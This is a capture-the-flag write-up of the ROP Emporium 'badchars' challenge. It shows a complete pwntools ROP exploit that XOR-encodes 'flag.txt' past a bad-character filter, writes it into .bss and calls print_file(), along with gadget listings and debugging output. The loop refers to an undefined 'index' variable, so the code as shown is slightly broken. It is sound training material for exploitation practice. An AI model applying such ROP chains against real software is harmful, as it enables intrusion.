# BADCHARS

*This challenge genuinely gave me nightmares.*

[badchars](https://ropemporium.com/challenge/badchars.html)

This is basically write4 but you can't write certain characters. How does this affect us? Everything.

In badchars, the `pwnme()` function will check if the input string has any of the listed bad characters: `'x'`, `'g'`, `'a'` or `'.'`. This means that we can't have any of the 4 characters in our attack or it would do things other than print out the flag.

This poses a challenge that seems impossible at first, namely that "flag.txt" has all 4 bad characters (`'x'`, `'g'`, `'a'` and `'.'`) inside it. How are we supposed to get around this without the checker ruining our day?

Easy, encode "flag.txt" into a format such that all of the bytes are don't contain any of the 4 bad characters.

Now, we can't use any sophisticated encoding algorithms like Caesar's cipher because firstly, there isn't any functions that allow us to do that, and secondly, we wouldn't be able to create a ROP chain to perform a Caesar's cipher both ways within the 512 byte limit. Instead, we can use the unassuming but powerful [XOR cipher](https://en.wikipedia.org/wiki/XOR_cipher).

What's so powerful about the XOR cipher? Well, it relies on the simple property that the XOR operator is a self-inverse function. What does that mean? If we were to evaluate `a ^ b` and save the result to `c` (`c = a ^ b`), then evaluate `c ^ b`, we would get the value of `a` back! Try it, the code snippet below shouldn't raise an `AssertionError`.

```python
from random import randint

for _ in range(100):
    a = randint(0, 255)
    b = randint(0, 255)
    c = a ^ b
    assert a == c ^ b
```

In addition, the XOR instruction can be found in abundance in every x86_64 binary, and each instruction in x86_64 is at most 5 bytes large, which makes fitting 16 XOR ROP chains into the 512 byte input a walk in the park.

So in summary, what we have to do is:

1. encode our "flag.txt" using XOR cipher,
2. copy the encoded string into the `.data` section,
3. decode the encoded string using the same XOR cipher, and finally
4. call `print_file()` with the memory address of our "flag.txt" in `rdi`.

Let's start looking for gadgets and read/writeable memory regions now.

```
$ ROPgadget --binary ./badchars --ropchain
...
0x0000000000400634 : mov qword ptr [r13], r12 ; ret
...
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
...
0x00000000004006a0 : pop r14 ; pop r15 ; ret
...
0x00000000004006a3 : pop rdi ; ret
...
0x00000000004004ee : ret
...
0x0000000000400628 : xor byte ptr [r15], r14b ; ret
...
```

```
$ rabin2 -S ./badchars
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
...
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
...

```

We can now construct our exploit. I will split up the code into the 4 steps mentioned above.

## Encoding the payload

The first step is to encode our string using the XOR cipher. The `encode()` function below takes an `input` of 8 bytes and encodes it using an 8-byte `key`. This 8-byte key can be generated by passing an integer between 0 and 255 to `extend_byte()`, which duplicates this integer 8 times to create an integer that is 8 bytes long.

```python
# taken from `https://jasper.la/posts/ropemporium-5-badchars/`
def extend_byte(byte: int) -> int:
    """
    Extend a byte into a 64-bit integer by duplicating the byte 8 times
    """
    return int("0x" + (hex(byte)[2:4])*8, 16)

# input must be 8 bytes long, key must be between 0 and 255
def encode(input: bytes, key: int, badchars: bytes) -> bytes:
    unencoded = u64(input)
    encoded = p64(unencoded ^ key)
    for badchar in badchars:
        if p8(badchar) in encoded:
            raise ValueError(f"bad byte in final encoded: {encoded}")
    return encoded
```

All we have to do now is to select our key and encode our payload using the `encode()` function. The key that I have chosen to use is `0xa9`. We should ensure that the first bit of the key is a 1, because this guarantees that all of the encoded characters are not within the ASCII range of 0 to 127. For example, `'x'` is `0x78`. When we encode it using `0xa9` as the key, we get `0xd1`, which is outside the ASCII encoding space.

```
  0111 1000 <- 0x78
^ 1010 1001 <- 0xa9
-----------
  1101 0001 <- 0xd1
```

```python
ENCODED_1 = encode(b"flag.txt", extend_byte(0xa9), b"xga.")
```

## Copy the string to `.data`

Next we move the encrypted "flag.txt" to the `.data` section (which from the output of the `rabin2 -S ./badchars` command tells us is read/writeable). This operation should be similar to what we did in `./write4`. We assume that the memory region around our target destination are all filled with zeroes, so we don't have to copy `b"\x00"*8` after our encrypted "flag.txt".

```python
DATA = 0x601028 # .data
POPR12R13R14R15 = p64(0x40069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
MOVR13R12 = p64(0x400634) # mov qword ptr [r13], r12 ; ret

attack = b"A"*0x28 + POPR12R13R14R15 + ENCODED_1 + p64(DATA) + b"B"*16
# attack += POPR12R13R14R15 + b"\x00"*8 + p64(DATA+8) + b"JUNK"*4
# r13 -> .data
# r12 -> encoded string
attack += MOVR13R12 # move encoded string into .data
```

Since the gadget at `0x40069c` also pops `r14` and `r15` which we don't intend to use just yet, we can let it pop junk data, in this case a 16 bytes long string of 'B', with each of the 2 unused registers taking 8 bytes of the junk.

## Decode the encoded string

Here comes the fun part. We can now use the same key we used to encode "flag.txt" to decode it back to the original string using the same XOR cipher. To do that, we need to use the `xor` gadget we found earlier using `ROPgadget --binary ./badchars --ropchain`. However, since the `xor` gadget that we discovered only allows us to perform a XOR operation one byte at a time, we have to repeat that gadget 8 times, with each iteration pointing to the memory address of the next byte in the "flag.txt" string in .data.

```python
DATA = 0x601028 # .data
POPR14R15 = p64(0x4006a0) # pop r14 ; pop r15 ; ret
XORBR15R14 = p64(0x400628) # xor byte ptr [r15], r14b ; ret

for i in range(8):
    attack += POPR14R15
    attack += p64(0xa9) # pop the key into r14
    attack += p64(DATA+index) # the memory address of the byte we want to decode
    attack += XORBR15R14 # perform the XOR cipher with r14 as the key and r15 as the memory address
```

## Call `print_file()`

Now that we have decoded our string, we can pass the memory address of that string into `rdi` and call `print_file()`.

```python
DATA = 0x601028 # .data
POPRDI = p64(0x4006a3) # pop rdi ; ret
RET = p64(0x4004ee) # ret
PRINT_FILE = p64(0x400510) # print_file()

attack += POPRDI + p64(DATA) + RET + PRINT_FILE
```

## Launching the attack

The final code should look something like this:

```python
from pwn import *
...
def extend_byte(byte: int) -> int:
    """
    Extend a byte into a 64-bit integer by duplicating the byte 8 times
    """
    return int("0x" + (hex(byte)[2:4])*8, 16)

# input must be 8 bytes long, key must be between 0 and 255
def encode(input: bytes, key: int, badchars: bytes) -> bytes:
    unencoded = u64(input)
    encoded = p64(unencoded ^ key)
    for badchar in badchars:
        if p8(badchar) in encoded:
            raise ValueError(f"bad byte in final encoded: {encoded}")
    return encoded

BADCHARS = b"xga."
# make sure 1st bit is 1 because all of the badchars don't have a 1 in front
KEY = 0xa9
DATA = 0x601028 # .data
POPR14R15 = p64(0x4006a0) # pop r14 ; pop r15 ; ret
XORBR15R14 = p64(0x400628) # xor byte ptr [r15], r14b ; ret
POPR12R13R14R15 = p64(0x40069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
MOVR13R12 = p64(0x400634) # mov qword ptr [r13], r12 ; ret
POPRDI = p64(0x4006a3) # pop rdi ; ret
RET = p64(0x4004ee) # ret
PRINT_FILE = p64(0x400510) # print_file()

# STEP 1
ENCODED_1 = encode(b"flag.txt", extend_byte(0xa9), b"xga.")

# STEP 2
attack = b"A"*0x28 + POPR12R13R14R15 + ENCODED_1 + p64(DATA) + b"B"*16
# attack += POPR12R13R14R15 + b"\x00"*8 + p64(DATA+8) + b"JUNK"*4
# r13 -> .data
# r12 -> encoded string
attack += MOVR13R12 # move encoded string into .data

# STEP 3
for i in range(8):
    attack += POPR14R15
    attack += p64(0xa9) # pop the key into r14
    attack += p64(DATA+index) # the memory address of the byte we want to decode
    attack += XORBR15R14 # perform the XOR cipher with r14 as the key and r15 as the memory address

# STEP 4
attack += POPRDI + p64(DATA) + RET + PRINT_FILE

io.sendline(attack)
...
```

Let's go to our terminal and type in `./win.py` and...

```
$ ./win.py
...
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
Failed to open file: flag.t\xd1t
...
```

Bruh...

Why didn't the encoded `'x'` (0xd1) get decoded back to normal `'x'` (0x78)?

Let's try a different string...

```python
...
# STEP 1
ENCODED_1 = encode(b"/bin/cat", extend_byte(0xa9), b"xga.")
...
```

```
$ ./win.py
...
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
Failed to open file: /bin/c\xc8t
...
```

Huh. It seems like the decoder doesn't seem to be able to get at the 7th byte in our string.

Let's see what is getting written to the buffer when we try to form our ROP chain to decode the 7th byte in the encoded "flag.txt".

```python
...
# STEP 3
for i in range(8):
    attack += POPR14R15
    attack += p64(0xa9) # pop the key into r14
    attack += p64(DATA+index) # the memory address of the byte we want to decode
    attack += XORBR15R14 # perform the XOR cipher with r14 as the key and r15 as the memory address
    if i == 6: # remember counting starts from 0
        print("DEBUG")
        print("DEBUG")
        print(POPR14R15)
        print(p64(KEY))
        print(p64(DATA+index))
        print(XORBR15R14)
        print("DEBUG")
...
```

```
$ ./win.py
...
DEBUG
b'\xa0\x06@\x00\x00\x00\x00\x00'
b'\xa9\x00\x00\x00\x00\x00\x00\x00'
b'.\x10`\x00\x00\x00\x00\x00' <- 3rd string, 1st byte
b'(\x06@\x00\x00\x00\x00\x00'
DEBUG
...
```

Can you spot the problem? The troublemaker sure is tiny but if you zoom into the 3rd string, you'll see that there is a `'.'` in the 1st position. If you recall, `'.'` is one of our bad characters.

What can we do about this? Well, since we know that the 3rd string corresponds to this line:

```python
print(p64(DATA+index))
```

We know that the problem lies in the fact the memory address just so happens to produce a `'.'` when we try and convert it into bytes using `pwn.p64`. Since we know that the first byte (or the least significant byte because x86 is little endian) is the problem, we can simply choose another memory region to dump our string into. In my `win.py` I decided to use the `.bss` section by replacing the memory address of `.data` with the memory address of `.bss`.

```python
# DATA = 0x601028 # .data
DATA = 0x601038 # .bss
```

Let's run the script again and we should see the flag on the screen.

```
./win.py
...
ROPE{a_placeholder_32byte_flag!}
...
```
